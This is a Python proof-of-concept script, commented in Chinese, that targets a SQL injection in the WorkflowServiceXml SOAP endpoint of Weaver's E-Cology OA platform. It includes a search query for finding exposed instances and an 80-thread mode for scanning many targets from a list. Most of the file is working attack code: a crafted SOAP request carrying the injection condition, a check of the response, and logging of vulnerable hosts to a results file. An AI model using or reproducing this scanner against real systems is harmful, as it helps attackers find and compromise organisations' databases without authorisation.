# 泛微E-Cology WorkflowServiceXml SQL注入
# app="泛微-OA（e-cology）"
# 产品简介:泛微e-cology是一款由泛微网络科技开发的协同管理平台，支持人力资源、财务、行政等多功能管理和移动办公。
# 漏洞概述:泛微OAE-Cology 接口/services/WorkflowServiceXml 存在SQL注入漏洞，可获取数据库权限，导致数据泄露。

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ 
\x1b[38m███████╗     ██████╗ ██████╗ ██╗      ██████╗  ██████╗██╗   ██╗
\x1b[36m██╔════╝    ██╔════╝██╔═══██╗██║     ██╔═══██╗██╔════╝╚██╗ ██╔╝
\x1b[34m█████╗█████╗██║     ██║   ██║██║     ██║   ██║██║  ███╗╚████╔╝ 
\x1b[35m██╔══╝╚════╝██║     ██║   ██║██║     ██║   ██║██║   ██║ ╚██╔╝  
\x1b[31m███████╗    ╚██████╗╚██████╔╝███████╗╚██████╔╝╚██████╔╝  ██║   
\x1b[33m╚══════╝     ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝   ╚═╝     
                                        --author:Kucei
                                        --Version:泛微E-Cology WorkflowServiceXml SQL注入                                                   
\x1b[0m"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser('泛微E-Cology WorkflowServiceXml SQL注入')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()

    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/services/WorkflowServiceXml'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
        'Content-Type': 'text/xml',
        'Accept-Encoding': 'gzip',
        'Content-Length': '487'
    }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080',
    }
    data = """<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservices.workflow.weaver">\r\n    <soapenv:Header/>\r\n    <soapenv:Body>\r\n        <web:getHendledWorkflowRequestList>\r\n            <web:in0>1</web:in0>\r\n            <web:in1>1</web:in1>\r\n            <web:in2>1</web:in2>\r\n            <web:in3>1</web:in3>\r\n            <web:in4>\r\n                <web:string>1=1 AND 123=123</web:string>\r\n            </web:in4>\r\n        </web:getHendledWorkflowRequestList>\r\n    </soapenv:Body>\r\n</soapenv:Envelope>"""
    try :
        response = requests.post(url=target+url_payload,headers=headers,data=data,verify=False,proxies=proxies,timeout=5)
        # print(response.status_code)
        # print(response.text)
        if response.status_code == 200 and 'workflowName' in response.text:
            print( f"[+] {target} 存在漏洞！\n")
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target+url_payload+'\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")


if __name__ == '__main__':
    main()